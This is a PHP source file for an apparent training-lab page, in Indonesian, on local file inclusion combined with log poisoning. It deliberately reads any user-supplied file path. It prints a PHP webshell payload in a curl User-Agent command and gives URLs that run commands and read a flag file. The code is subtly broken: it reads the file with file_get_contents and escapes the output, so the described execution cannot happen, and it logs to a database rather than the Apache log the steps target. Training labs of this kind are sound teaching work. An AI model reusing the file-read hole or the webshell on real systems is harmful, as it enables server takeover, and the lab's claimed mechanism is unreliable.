<?php
$active = 'advanced-2';
require_once '../includes/db.php';
$conn = getDB();

// Catat access ke database untuk simulasi log
$ip  = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
$ua  = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$uri = $_SERVER['REQUEST_URI'] ?? '/advanced-2/';

$stmt = $conn->prepare("INSERT INTO access_log (ip_address, user_agent, request_path) VALUES (?, ?, ?)");
$stmt->bind_param('sss', $ip, $ua, $uri);
$stmt->execute();

// Ambil log terbaru untuk ditampilkan
$logs = [];
$res  = $conn->query("SELECT ip_address, user_agent, request_path, accessed_at FROM access_log ORDER BY id DESC LIMIT 20");
while ($row = $res->fetch_assoc()) $logs[] = $row;

// LFI endpoint
$page   = $_GET['page'] ?? '';
$output = ''; $error = '';

if ($page !== '') {
    if (file_exists($page)) {
        $output = file_get_contents($page);
    } else {
        $error = "File tidak ditemukan: " . htmlspecialchars($page, ENT_QUOTES, 'UTF-8');
    }
}

// Deteksi apakah User-Agent mengandung PHP code (untuk feedback ke user)
$has_php_ua = str_contains($ua, '<?php') || str_contains($ua, '<?=');
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Advanced 2: Log Poisoning — IDN Lab</title>
<?php include '../includes/shared_css.php'; ?>
</head>
<body>
<?php include '../includes/nav.php'; ?>

<div class="phdr">
  <div class="phdr-in">
    <div class="bc"><a href="/">Dashboard</a><span class="bc-sep">/</span><span>Advanced 2: LFI + Log Poisoning</span></div>
    <h1>LFI + Log Poisoning <span class="tag r">ADVANCED 2</span></h1>
    <p class="phdr-desc">Kombinasi dua teknik: injeksi PHP code ke dalam log server melalui HTTP header, kemudian gunakan LFI untuk mengeksekusi kode yang tersimpan di log tersebut.</p>
  </div>
</div>

<div class="wrap">

  <div class="box">
    <div class="box-t">Objectives</div>
    <ul class="obj-list">
      <li><div class="obj-n">1</div><span>Pahami bahwa User-Agent header dicatat ke dalam access log server</span></li>
      <li><div class="obj-n">2</div><span>Kirim request dengan User-Agent berisi PHP code: <code class="ic">&lt;?php system($_GET['cmd']); ?&gt;</code></span></li>
      <li><div class="obj-n">3</div><span>Include file log via parameter LFI untuk mengeksekusi PHP code yang tersimpan</span></li>
      <li><div class="obj-n">4</div><span>Jalankan command <code class="ic">id</code> dan <code class="ic">cat /var/private/flag.txt</code> melalui webshell</span></li>
    </ul>
  </div>

  <div class="box">
    <div class="box-t">Attack Flow — Log Poisoning</div>
    <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:10px">
      <?php
      $steps = [
        ['01','Identify Log','Temukan path file log yang dapat dibaca via LFI','var(--blue)'],
        ['02','Poison Log','Kirim PHP payload di User-Agent header','var(--orange)'],
        ['03','Include Log','Gunakan LFI untuk include file log yang sudah ter-poison','var(--red)'],
        ['04','Execute','PHP code di dalam log dieksekusi oleh server','var(--green)'],
      ];
      foreach ($steps as $s): ?>
      <div style="background:var(--el);border:1px solid var(--bd);border-radius:var(--r);padding:14px;text-align:center">
        <div style="font-size:.62rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--t3);font-family:var(--mono);margin-bottom:6px"><?= $s[0] ?></div>
        <div style="font-size:.82rem;font-weight:700;color:<?= $s[3] ?>;margin-bottom:4px"><?= $s[1] ?></div>
        <div style="font-size:.73rem;color:var(--t2)"><?= $s[2] ?></div>
      </div>
      <?php endforeach; ?>
    </div>
  </div>

  <?php if ($has_php_ua): ?>
  <div class="alert a-ok">User-Agent mengandung PHP code &mdash; log telah ter-poison. Sekarang include file log untuk mengeksekusinya.</div>
  <?php endif; ?>

  <!-- Access Log Display -->
  <div class="box">
    <div class="box-t">Access Log &mdash; <?= count($logs) ?> entri terbaru <span style="font-size:.65rem;color:var(--t3)">(User-Agent disimpan verbatim ke database)</span></div>
    <div class="tbl-wrap">
      <table class="tbl">
        <thead><tr><th>IP</th><th>User-Agent</th><th>Path</th><th>Waktu</th></tr></thead>
        <tbody>
          <?php foreach ($logs as $l): ?>
          <tr>
            <td><?= htmlspecialchars($l['ip_address'], ENT_QUOTES, 'UTF-8') ?></td>
            <td style="max-width:280px;word-break:break-all;<?= (str_contains($l['user_agent'],'<?php') || str_contains($l['user_agent'],'<?=')) ? 'color:var(--red)' : '' ?>">
              <?= htmlspecialchars($l['user_agent'], ENT_QUOTES, 'UTF-8') ?>
            </td>
            <td><?= htmlspecialchars($l['request_path'], ENT_QUOTES, 'UTF-8') ?></td>
            <td style="white-space:nowrap"><?= htmlspecialchars($l['accessed_at'], ENT_QUOTES, 'UTF-8') ?></td>
          </tr>
          <?php endforeach; ?>
        </tbody>
      </table>
    </div>
  </div>

  <!-- LFI endpoint -->
  <div class="box">
    <div class="box-t">LFI Endpoint &mdash; Include File Log</div>
    <p class="prose" style="margin-bottom:12px">Path log Apache dalam container: <code class="ic">/var/log/apache2/access.log</code></p>
    <div class="frow" style="align-items:flex-end">
      <div class="fg" style="flex:1;margin-bottom:0">
        <label class="fl">Parameter ?page=</label>
        <input class="fi" type="text" id="page-input"
          value="<?= htmlspecialchars($page, ENT_QUOTES, 'UTF-8') ?>"
          placeholder="/var/log/apache2/access.log">
      </div>
      <button class="btn btn-r" onclick="goToPage()">Include</button>
      <?php if($page): ?><a href="/advanced-2/" class="btn btn-g">Reset</a><?php endif; ?>
    </div>
    <?php if (isset($_GET['cmd'])): ?>
    <div style="margin-top:12px">
      <label class="fl">Command (?cmd=)</label>
      <input class="fi" type="text" id="cmd-input"
        value="<?= htmlspecialchars($_GET['cmd'] ?? '', ENT_QUOTES, 'UTF-8') ?>"
        placeholder="id, whoami, cat /var/private/flag.txt">
    </div>
    <?php endif; ?>
  </div>

  <?php if ($page !== ''): ?>
  <?php if ($error): ?>
    <div class="alert a-err"><?= $error ?></div>
  <?php elseif ($output !== ''): ?>
    <div class="box">
      <div class="box-t">File Output</div>
      <div class="file-out"><?= htmlspecialchars($output, ENT_QUOTES, 'UTF-8') ?></div>
    </div>
  <?php endif; ?>
  <?php endif; ?>

  <div class="box">
    <div class="box-t">Step-by-Step Guide</div>
    <div class="qbox"><div class="ql">Langkah eksploitasi</div><span class="cm">-- Step 1: Poison log dengan PHP webshell via curl</span>
curl -A <span class="str">'&lt;?php system($_GET["cmd"]); ?&gt;'</span> http://[IP]:8083/advanced-2/

<span class="cm">-- Step 2: Include file log (PHP akan dieksekusi)</span>
http://[IP]:8083/advanced-2/?page=/var/log/apache2/access.log&amp;cmd=id

<span class="cm">-- Step 3: Baca flag</span>
http://[IP]:8083/advanced-2/?page=/var/log/apache2/access.log&amp;cmd=cat+/var/private/flag.txt</div>
  </div>

  <div class="box">
    <div class="box-t">Hints</div>
    <details class="hint">
      <summary>Hint 1 &mdash; Cara menyuntikkan PHP ke log</summary>
      <div class="hint-body">Gunakan curl dengan custom User-Agent:<br><code class="ic">curl -A '&lt;?php system($_GET["cmd"]); ?&gt;' http://[IP]:8083/advanced-2/</code><br>Setelah request ini, log akan mengandung PHP code.</div>
    </details>
    <details class="hint">
      <summary>Hint 2 &mdash; Include log file</summary>
      <div class="hint-body">Setelah log ter-poison, include melalui LFI:<br><code class="ic">?page=/var/log/apache2/access.log&cmd=whoami</code><br>PHP code di dalam log akan dieksekusi dan output dari <code class="ic">system()</code> akan muncul di tengah konten log.</div>
    </details>
    <details class="hint">
      <summary>Hint 3 &mdash; Jika log tidak bisa dibaca</summary>
      <div class="hint-body">Access log Apache ada di beberapa lokasi tergantung distro:<br><code class="ic">/var/log/apache2/access.log</code> (Debian/Ubuntu)<br><code class="ic">/var/log/httpd/access_log</code> (CentOS/RHEL)<br><code class="ic">/proc/self/fd/1</code> (fallback via /proc)</div>
    </details>
    <details class="hint">
      <summary>Hint 4 &mdash; Mitigasi</summary>
      <div class="hint-body">Log poisoning hanya berhasil jika dua kondisi terpenuhi sekaligus: (1) ada LFI, dan (2) server mengeksekusi PHP di dalam file yang di-include. Mitigasi: gunakan <code class="ic">file_get_contents()</code> daripada <code class="ic">include()</code> agar PHP code tidak dieksekusi, dan batasi path dengan whitelist.</div>
    </details>
  </div>

</div>

<script>
function goToPage() {
    var p = document.getElementById('page-input').value;
    var c = document.getElementById('cmd-input') ? document.getElementById('cmd-input').value : '';
    if (p) {
        var url = '/advanced-2/?page=' + encodeURIComponent(p);
        if (c) url += '&cmd=' + encodeURIComponent(c);
        window.location.href = url;
    }
}
document.getElementById('page-input').addEventListener('keydown', function(e) {
    if (e.key === 'Enter') goToPage();
});
</script>

<?php include '../includes/footer.php'; ?>
</body>
</html>
